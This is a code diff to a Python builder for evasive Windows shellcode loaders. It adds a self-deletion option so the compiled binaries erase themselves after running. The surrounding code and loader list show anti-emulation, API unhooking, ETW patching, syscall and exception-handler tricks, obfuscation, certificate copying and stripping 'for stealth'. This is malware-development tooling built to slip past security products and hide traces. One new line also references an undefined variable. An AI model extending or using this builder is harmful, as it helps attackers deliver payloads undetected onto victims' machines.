@@ -242,9 +242,30 @@ def insert_junk_api_calls(content, junk_api, main_func_pattern):
 
     return content
 
+### Self deletion function for output binaries: 
+def insert_self_deletion(content):
+    # Add the include statement for self-deletion at the top of the file
+    if '#include "self_deletion.h"' not in content:
+        content = '#include "self_deletion.h"\n' + content
+
+    # Replace any commented or non-commented version of ####END#### with Perform();
+    placeholder = '####END####'
+    if placeholder in content:
+        # Ensure we remove any comment symbols around the placeholder
+        content = re.sub(r'//\s*####END####', 'perform();', content)  # Remove `//` comments if present
+        content = content.replace(placeholder, 'perform();')  # Replace the placeholder if not commented
+    else:
+        print("Error: '####END####' placeholder not found in the main function.")
+    
+    return content
+
+
+
+
+
 
 # def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, compile_as_exe = False, compile_as_scr = False, compile_as_sys = False, compile_as_dll = False, compile_as_drv = False, compile_as_ocx = False, compile_as_tlb = False, compile_as_tsp = False, compile_as_msc = False, compile_as_msi = False, compile_as_msp = False, compile_as_mst)
-def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, star_dust = False):
+def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type, output_path, sleep_flag, anti_emulation, junk_api, api_unhooking, god_speed, encoding=None, dream_time=None, file_name=None, etw=False, compile_as_dll=False, compile_as_cpl = False, star_dust = False, self_deletion=False):
 
     # Adjust loader_template_path for DLL
     if compile_as_dll:
@@ -609,6 +630,11 @@ def write_loader(loader_template_path, shellcode, shellcode_file, shellcode_type
                 # Ensure sleep call is added after anti-emulation call if both flags are set
                 content = content[:next_line_start] + sleep_call_with_indentation + content[next_line_start:]
 
+
+    # If self-deletion is enabled, insert the self-deletion logic TODO: 
+    if self_deletion:
+        content = insert_self_deletion(content)
+
     # Write to the new loader file
     with open(output_path, 'w') as file:
         file.write(content)
@@ -634,7 +660,7 @@ def run_obfuscation(loader_path):
             os.rename(patch_file, obf_file)
 
 
-def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulation, insert_junk_api_calls, api_unhooking=False, mllvm_options=None, god_speed=False, encoding=None, loader_number=1, dream=None, etw=False, compile_as_dll=False, compile_as_cpl = False):
+def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulation, insert_junk_api_calls, api_unhooking=False, mllvm_options=None, god_speed=False, encoding=None, loader_number=1, dream=None, etw=False, compile_as_dll=False, compile_as_cpl = False, self_deletion=False):
 
     
     # Find the latest MinGW directory
@@ -652,7 +678,7 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         print("Error: No x86_64-w64-mingw32 directory found.")
         sys.exit(1)
 
-    if loader_number == 1 or 39 or 40 or 41:
+    if loader_number in [1, 39, 40, 41]:
         try:
             subprocess.run(['nasm', '-f', 'win64', 'assembly.asm', '-o', 'assembly.o'], check=True)
             print("[+] NASM assembly compilation successful.")
@@ -762,16 +788,19 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         compile_command.append('./evader/normal_api.c')
     if api_unhooking:
         compile_command.append('./evader/api_untangle.c')
+    if self_deletion:
+        compile_command.append('./evader/self_deletion.c')
     compile_command.append('-static-libgcc')
     compile_command.append('-static-libstdc++')
     compile_command.append('-lole32')
     if loader_number == 33: 
         compile_command.append('./syscall.c')
         compile_command.append('assembly.o')
-    if loader_number == 1 or 39 or 40 or 41:
+    if loader_number in [1, 39, 40, 41]:
+
         compile_command.append('assembly.o')
         compile_command.append('-luuid')
-    if loader_number == 37 or 38 or 48 or 49 or 51 or 52 or 56:
+    if loader_number in [37, 38, 48, 49, 51, 52, 56, 58, 59, 60, 61, 62, 63, 64, 65]:
         compile_command.append('./evader/pebutils.c')
         
 
@@ -784,7 +813,7 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         print(f"[-] Compilation failed: {e}")
 
 
-def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_flag, anti_emulation, insert_junk_api_calls, compiler, api_unhooking, god_speed=False, encoding=None, dream=None, etw=False):
+def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_flag, anti_emulation, insert_junk_api_calls, compiler, api_unhooking, god_speed=False, encoding=None, dream=None, etw=False, self_deletion=False):
     # Create output directory if it doesn't exist
     output_dir = os.path.dirname(output_name)
     if not os.path.exists(output_dir):
@@ -795,6 +824,8 @@ def compile_with_syswhisper(loader_path, output_name, syswhisper_option, sleep_f
     additional_sources = []
     if anti_emulation:
         additional_sources.extend(['./evader/anti_emu.c', '-lws2_32', '-lpsapi', '-lole32'])
+    if self_deletion:
+        compile_command.append('./evader/self_deletion.c')
     if etw:
         additional_sources.append('./evader/etw_pass.c')
     ## TODO: Add support for other encoding types
@@ -1048,14 +1079,14 @@ def main():
     54. Stealth new loader + Exception handler + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk, with Decoy address, PAGE_NOACCESS and XOR)
     56. This is a fork of Loader 37 with additional features. If -ldr flag is not provided, loader will add module (contains the shellcode) to the PEB module lists manually using code from Dark library. 
     57. A fork of loader 51 with XOR replaced with RC4 encryption offered by SystemFunction032/033.
-    58. VEH add hanlder. Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse. 
-    59. SEH add hanlder. Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse.
-    60. Use Page guard to trigger first exception to set debug registers without using NtGetContextThread --> NtSetContextThread
-    61. Use Page guard to trigger first exception to set debug registers without using NtGetContextThread --> NtSetContextThread + Use VEH to set up breakpoints Dr0~Dr3, Dr7. Then use VCH to execute the code. So, no registers and stack pointer and instruction pointer changed in VEH. 
+    58. New loader in progress.
+    59. New loader in progress.
+    60. New loader in progress.
+    61. New loader in progress.
     62. New loader in progress.
-    63. Remote version of custom module loading loader 37. Remote module injection.
-    64.
-    65. Advanced VMT hooking with custom module loader 37. 
+    63. New loader in progress.
+    64. New loader in progress.
+    65. New loader in progress.
 
      """
 
@@ -1123,6 +1154,11 @@ def main():
 
     ## add a new option that adds watermark to our binary, this is true by default if not specified:
     parser.add_argument('-wm', '--watermark', type=int, nargs='?', const=1, default=1, help='Add watermark to the binary (0 for False, 1 or no value for True)')
+
+    ## TODO: 
+    ### need a -d --self-deletion argument where the binary deletes itself after execution, it should be False by default:
+    parser.add_argument('-d', '--self-deletion', action='store_true', help='Enable self-deletion of the binary after execution')
+
 
     parser.add_argument('-s', '--sign-certificate', nargs='?', const='ask_user', 
                         help='Optional: Sign the output binary and copy metadata from another binary to your output. If a website or filepath is provided, use it. Defaults to interactive mode if no argument is provided.')
@@ -1217,7 +1253,7 @@ def main():
     ##print the args.encoding:
     # print(f"using encoding option: {args.encoding}")
     # write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding)
-    write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding, args.dream, file_name, args.etw, compile_as_dll=args.dll, compile_as_cpl=args.cpl, star_dust = args.star_dust)
+    write_loader(template_loader_path, shellcode, shellcode_file, args.shellcode_type, output_loader_path, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.god_speed, args.encoding, args.dream, file_name, args.etw, compile_as_dll=args.dll, compile_as_cpl=args.cpl, star_dust = args.star_dust, self_deletion=args.self_deletion)
 
     if args.obfuscate:
         print("Obfuscating the loader code...\n")
@@ -1240,9 +1276,9 @@ def main():
     ##print the output_file_path
     print(f"Output file path: {output_file_path}")
     if use_syswhisper:
-        compile_with_syswhisper(obfuscated_loader_path, output_file_path, args.syswhisper if args.syswhisper is not None else 1, args.sleep, args.anti_emulation, args.junk_api, args.compiler, args.api_unhooking, args.god_speed, args.encoding, args.dream, args.etw)
+        compile_with_syswhisper(obfuscated_loader_path, output_file_path, args.syswhisper if args.syswhisper is not None else 1, args.sleep, args.anti_emulation, args.junk_api, args.compiler, args.api_unhooking, args.god_speed, args.encoding, args.dream, args.etw, args.self_deletion)
     else:
-        compile_output(obfuscated_loader_path, output_file_path, args.compiler, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.mllvm, args.god_speed, args.encoding, args.loader, args.dream, args.etw, args.dll, args.cpl)
+        compile_output(obfuscated_loader_path, output_file_path, args.compiler, args.sleep, args.anti_emulation, args.junk_api, args.api_unhooking, args.mllvm, args.god_speed, args.encoding, args.loader, args.dream, args.etw, args.dll, args.cpl, args.self_deletion)
 
 
 
@@ -1271,7 +1307,8 @@ def main():
         obfuscate_with_api(output_file_path)
     elif not args.obfuscate_api:
         ## strip the binary, if not obfuscating the API. Because the obfuscation tool will not be compatiable with the format. 
-        strip_binary(output_file_path)
+        print("Stripping the binary to reduce its size and potentially increase its stealth.")
+        # strip_binary(output_file_path)
 
     ## Add watermark to the binary:
     # args.watermark = bool(args.watermark)
